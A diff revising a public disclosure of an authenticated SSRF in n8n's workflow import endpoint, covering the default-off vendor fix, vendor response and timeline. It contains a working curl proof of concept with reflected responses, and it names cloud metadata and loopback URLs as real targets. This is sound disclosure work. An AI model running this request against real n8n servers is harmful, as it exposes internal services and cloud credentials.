@@ -6,77 +6,37 @@
 | Product | n8n |
 | Type | SSRF (CWE-918), authenticated |
 | Affected versions | `<= 2.19.x` unconditionally (validated on 2.19.0); `2.20.0` – `2.28.2` (latest) by default, i.e. when `N8N_SSRF_PROTECTION_ENABLED` is not set to `true` |
-| Fixed in | 2.20.0 (released 2026-05-05), via [PR #29178](https://github.com/n8n-io/n8n/pull/29178) / commit [`ecd0ba8eba`](https://github.com/n8n-io/n8n/commit/ecd0ba8eba) — but opt-in only (see below) |
+| Fixed in | 2.20.0 (released 2026-05-05), via [PR #29178](https://github.com/n8n-io/n8n/pull/29178) / commit [`ecd0ba8eba`](https://github.com/n8n-io/n8n/commit/ecd0ba8eba) — opt-in only |
 | CVE | none assigned |
-| Status | Independent parallel discovery; fixed as a non-security bugfix, no advisory; fix is incomplete by default |
+| Status | Independent parallel discovery; fixed as a non-security bugfix, no advisory; exploitable by default |
 
-### Status detail
+## Executive summary
 
-- This was an **independent parallel discovery**. n8n found and began fixing the
-  same issue internally before this report: [PR #29178](https://github.com/n8n-io/n8n/pull/29178)
-  was opened 2026-04-27 (tracked under internal ticket CAT-2890) and merged
-  2026-04-29. This report was filed independently on 2026-04-29.
-- The fix shipped in 2.20.0 (2026-05-05). It was released as an ordinary
-  `fix(core)` bugfix — **no CVE and no security advisory were issued**, so the
-  change is not flagged to operators as a security fix.
-- The vendor declined this report on 2026-05-20 as not qualifying.
-- This disclosure documents (a) a confirmed SSRF that was fixed without a
-  security advisory, and (b) that the fix is **incomplete by default**: on a
-  stock install the endpoint remains exploitable.
+`GET /rest/workflows/from-url` lets any authenticated, non-admin user with
+project-scoped `workflow:create` permission make the n8n server issue an
+outbound HTTP request to an arbitrary URL — a server-side request forgery
+reaching loopback, link-local, and RFC1918 internal addresses, with the response
+reflected to the caller when it is workflow-shaped JSON.
 
-## Summary
+n8n added URL validation in 2.20.0 (PR #29178), routing the fetch through its
+`SsrfProtectionService`. **But that protection is gated on
+`N8N_SSRF_PROTECTION_ENABLED`, which is off by default**, so the latest release
+(2.28.2) remains exploitable out of the box. The change shipped as an ordinary
+`fix(core)` bugfix with **no CVE and no security advisory**, so operators are
+not told it is a security-relevant setting they must enable.
 
-n8n exposed an authenticated server-side request forgery (SSRF) in the workflow
-import endpoint `GET /rest/workflows/from-url`. The handler took a
-user-controlled `url` query parameter and performed a direct
-`axios.get(query.url)` with no hostname validation, no IP blocklist, and no
-integration with n8n's own `SsrfProtectionService`.
+## Affected and fix status
 
-Any authenticated, non-admin user holding project-scoped `workflow:create`
-permission could use this endpoint to make the n8n server issue
-outbound HTTP requests to arbitrary destinations — including loopback
-(`127.0.0.1`), link-local (`169.254.0.0/16`), and RFC1918 internal ranges — and
-have the response body reflected back to the caller when it matched the expected
-workflow JSON shape.
-
-## Relevant n8n behavior (pre-fix)
-
-In `packages/cli/src/workflows/workflows.controller.ts`, the `getFromUrl`
-handler:
-
-- was reachable by any authenticated user with `workflow:create` in a project;
-- read the user-controlled `query.url`;
-- called `axios.get<IWorkflowResponse>(query.url)` directly;
-- returned the fetched body to the caller if it parsed as workflow JSON, and a
-  generic `400` otherwise — but only *after* the server-side request had fired.
-
-## Proof of concept
-
-Validated against a local self-hosted instance
-(`docker run -p 5678:5678 n8nio/n8n:2.19.0`).
-
-Prerequisite: any authenticated account with `workflow:create` in at least one
-project.
-
-```bash
-# Trigger the server-side fetch to an attacker-chosen internal address
-curl -v -G -b /tmp/n8n-cookies.txt \
-  'http://localhost:5678/rest/workflows/from-url' \
-  --data-urlencode "projectId=$PROJECT_ID" \
-  --data-urlencode 'url=http://172.17.0.1:8888/'
-```
-
-Observed: the n8n server made the outbound request to the chosen internal
-address (confirmed in the target's access log, `User-Agent: axios/1.15.0`).
-When the internal service returned JSON with `nodes` and `connections` keys, the
-full response body was reflected to the caller with `200 OK`:
-
-```
-HTTP/1.1 200 OK
-Content-Type: application/json; charset=utf-8
-
-{"data":{"nodes":[],"connections":{},"secret":"SSRF_CONFIRMED"}}
-```
+- **Independent parallel discovery.** n8n found and began fixing this internally
+  before the report: PR #29178 was opened 2026-04-27 (internal ticket CAT-2890)
+  and merged 2026-04-29. This SSRF was reported to the n8n security team
+  independently on 2026-04-29. This disclosure does **not** claim the fix was
+  prompted by the report and seeks no credit for it.
+- **Fixed but opt-in.** The fix shipped in 2.20.0 (2026-05-05) but only engages
+  when `N8N_SSRF_PROTECTION_ENABLED=true`; the default is off (see
+  *Fix status*).
+- **No advisory.** Released as a plain `fix(core)` bugfix — no CVE, no GHSA.
+- **Vendor declined** the report on 2026-05-20 as not qualifying.
 
 ## Confirmed impact
 
@@ -90,17 +50,25 @@ standard precondition for reaching internal services and cloud metadata
 endpoints. Cloud metadata exfiltration was not independently validated and is
 not claimed here as confirmed.
 
-## The fix — and why it is incomplete by default
+## Vulnerable behavior (pre-fix)
 
-The endpoint was remediated in:
+In `packages/cli/src/workflows/workflows.controller.ts`, the `getFromUrl`
+handler:
 
-- [PR #29178](https://github.com/n8n-io/n8n/pull/29178) — "fix(core): Validate workflow import URL requests"
-- commit [`ecd0ba8eba`](https://github.com/n8n-io/n8n/commit/ecd0ba8eba)
-- first released in n8n 2.20.0 on 2026-05-05
+- was reachable by any authenticated user with `workflow:create` in a project;
+- read the user-controlled `query.url`;
+- called `axios.get<IWorkflowResponse>(query.url)` directly — no hostname
+  validation, no IP blocklist, no SSRF service;
+- returned the fetched body to the caller if it parsed as workflow JSON, and a
+  generic `400` otherwise — but only *after* the server-side request had fired.
 
-The handler no longer calls `axios.get(query.url)` directly. It now routes the
-user-supplied URL through `SsrfProtectionService` via a new
-`fetchWorkflowFromUrl()` method:
+## Fix status: implemented, but default-off
+
+The endpoint was remediated in [PR #29178](https://github.com/n8n-io/n8n/pull/29178)
+("fix(core): Validate workflow import URL requests", commit
+[`ecd0ba8eba`](https://github.com/n8n-io/n8n/commit/ecd0ba8eba)), first released
+in 2.20.0. The handler no longer calls `axios.get(query.url)` directly; it routes
+the URL through `SsrfProtectionService` via a new `fetchWorkflowFromUrl()`:
 
 ```ts
 private async fetchWorkflowFromUrl(url: string) {
@@ -117,44 +85,69 @@ private async fetchWorkflowFromUrl(url: string) {
 }
 ```
 
-**Protection is conditional on `this.ssrfConfig.enabled`, and that flag is off
-by default.** From `packages/@n8n/config/src/configs/ssrf-protection.config.ts`:
+Protection is conditional on `this.ssrfConfig.enabled`, and that flag is off by
+default. From `packages/@n8n/config/src/configs/ssrf-protection.config.ts`:
 
 ```ts
 @Env('N8N_SSRF_PROTECTION_ENABLED')
 enabled: boolean = false; // "Off by default so existing self-hosted setups ... keep working"
 ```
 
-Consequently, on a default install (where `N8N_SSRF_PROTECTION_ENABLED` is
-unset), `fetchWorkflowFromUrl` passes `ssrf: 'disabled'` and performs an
-**unprotected** outbound fetch. The proof-of-concept above — run on a stock
-container with no flag set — continues to succeed on patched 2.20.0+ builds.
-
-When the flag *is* enabled, the request is routed through the
-`SsrfProtectionService` in `packages/@n8n/backend-network`, which validates the
-resolved IP at pre-flight, at socket connect time (a custom DNS `lookup`, so a
-rebinding TOCTOU is rechecked), and on every HTTP redirect hop, against a
-blocklist covering loopback, link-local and RFC1918 ranges.
+So on a default install `fetchWorkflowFromUrl` passes `ssrf: 'disabled'` and
+performs an **unprotected** outbound fetch. When the flag *is* enabled, the
+request is validated by `SsrfProtectionService` (`packages/@n8n/backend-network`)
+at pre-flight, at socket connect time (a custom DNS `lookup`, so a rebinding
+TOCTOU is rechecked), and on every HTTP redirect hop, against a blocklist
+covering loopback, link-local and RFC1918 ranges.
 
 | Scenario | <= 2.19.x | 2.20.0+ |
 |---|---|---|
 | `N8N_SSRF_PROTECTION_ENABLED=true` | endpoint unprotected | protected |
 | Default install (flag unset) | vulnerable | **still vulnerable** |
 
-### Live confirmation on the latest release (n8n@2.28.2, 2026-06-26; listener timestamps are UTC)
+**Mitigation for operators:** set `N8N_SSRF_PROTECTION_ENABLED=true` (and
+consider network-layer egress restrictions). Verify with the PoC below — the
+request should then be rejected.
 
-**Setup.** A stock n8n container is run with no flags
-(`docker run -d -p 5678:5678 -e N8N_SECURE_COOKIE=false n8nio/n8n:2.28.2`).
-The attacker-supplied `url` is `http://172.17.0.1:8888/`, chosen to stand in for
-an internal target:
+## Proof of concept
+
+### Original behavior (2.19.0)
+
+Validated against `docker run -p 5678:5678 n8nio/n8n:2.19.0`. Prerequisite: any
+authenticated account with `workflow:create` in at least one project.
+
+```bash
+curl -v -G -b /tmp/n8n-cookies.txt \
+  'http://localhost:5678/rest/workflows/from-url' \
+  --data-urlencode "projectId=$PROJECT_ID" \
+  --data-urlencode 'url=http://172.17.0.1:8888/'
+```
+
+The n8n server made the outbound request to the chosen internal address
+(confirmed in the target's access log). When the internal service returned JSON
+with `nodes`/`connections` keys, the full body was reflected with `200 OK`:
+
+```
+HTTP/1.1 200 OK
+{"data":{"nodes":[],"connections":{},"secret":"SSRF_CONFIRMED"}}
+```
+
+### Latest release, default config (n8n@2.28.2, executed 2026-06-26; listener timestamps UTC)
+
+This confirms the issue persists on the current release out of the box.
+
+**Setup.** A stock container, no flags
+(`docker run -d -p 5678:5678 -e N8N_SECURE_COOKIE=false n8nio/n8n:2.28.2`). The
+attacker-supplied `url` is `http://172.17.0.1:8888/`, chosen to stand in for an
+internal target:
 
 - `172.17.0.1` is the Docker bridge gateway — the host as seen *from inside* the
   n8n container, an address the server can reach but an external attacker cannot.
-- It sits in `172.16.0.0/12` (RFC1918), the exact private range n8n's SSRF
-  blocklist covers, so the *same* URL exercises both states (reflected on a
-  default install, blocked when protection is on).
-- `:8888` is a logging HTTP listener that returns workflow-shaped JSON, so n8n
-  treats the fetch as a successful import and reflects the body. Its log records
+- It sits in `172.16.0.0/12` (RFC1918), the exact range n8n's blocklist covers,
+  so the *same* URL exercises both states (reflected by default, blocked when
+  protection is on).
+- `:8888` is a logging HTTP listener returning workflow-shaped JSON, so n8n
+  treats the fetch as a successful import and reflects the body; its log records
   who connected.
 
 In a real deployment an attacker would substitute a sensitive internal target
@@ -162,40 +155,36 @@ reachable by the n8n host, e.g. `http://169.254.169.254/latest/meta-data/`
 (cloud metadata), `http://127.0.0.1:5678/rest/...` (n8n's own loopback APIs), or
 any `http://10.x/192.168.x` internal service.
 
-**Result (default install, no flags)** — the fetch fires and the body is
-reflected; the listener log line `from=172.17.0.2` is the n8n container's own IP,
-proving the request was made server-side, not by the client:
+**Result (default, no flags)** — the fetch fires and the body is reflected; the
+log line `from=172.17.0.2` is the n8n container's own IP, proving the request was
+made server-side, not by the client:
 
 ```
 GET /rest/workflows/from-url ... url=http://172.17.0.1:8888/
 --> HTTP 200
 {"data":{"nodes":[],"connections":{},"secret":"SSRF_CONFIRMED_2282"}}
 
-listener log: VICTIM-HIT path=/ UA=n8n from=172.17.0.2   (request from the n8n container)
+listener log: VICTIM-HIT path=/ UA=n8n from=172.17.0.2
 ```
 
-**Same request with `N8N_SSRF_PROTECTION_ENABLED=true`:**
+**Contrast — same request with `N8N_SSRF_PROTECTION_ENABLED=true`** (blocked, no
+request reaches the listener):
 
 ```
 --> HTTP 400
 {"code":0,"message":"The request was blocked because it resolves to a restricted IP address"}
-(no request reaches the listener)
 ```
-
-The protection works; the shipped controller disables the SSRF bridge when the
-flag is unset, leaving this request path unprotected by default.
 
 ## Vendor position
 
 The vendor declined this report on 2026-05-20 as not qualifying, in part citing
-a shared-responsibility framing for self-hosted SSRF. The fix itself was
-independent internal work (PR #29178, opened before this report under CAT-2890),
-released as an ordinary bugfix without a CVE or advisory.
+a shared-responsibility framing for self-hosted SSRF. The fix was independent
+internal work, released as an ordinary bugfix without a CVE or advisory.
 
-This disclosure does not claim the fix was prompted by this report, and does not
-seek credit for it. It documents that the behavior is a genuine SSRF, that it
-was corrected without a public security advisory, and that the correction leaves
-the default configuration exploitable.
+This disclosure seeks no credit for the fix. It documents that the behavior is a
+genuine SSRF, that it was corrected without a public security advisory, and that
+the correction leaves the default configuration exploitable on the current
+release.
 
 ## Timeline
 
@@ -205,5 +194,4 @@ the default configuration exploitable.
 - 2026-05-05: fix released in n8n 2.20.0 (no CVE / no advisory).
 - 2026-05-20: vendor declines this report as "does not qualify."
 - 2026-06-13, 2026-06-17: reporter follow-ups requesting status.
-- 2026-06-26: public disclosure published (this document); independent
-  rediscovery noted, with emphasis on the default-off incomplete-fix gap.
+- 2026-06-26: public disclosure published (this document).
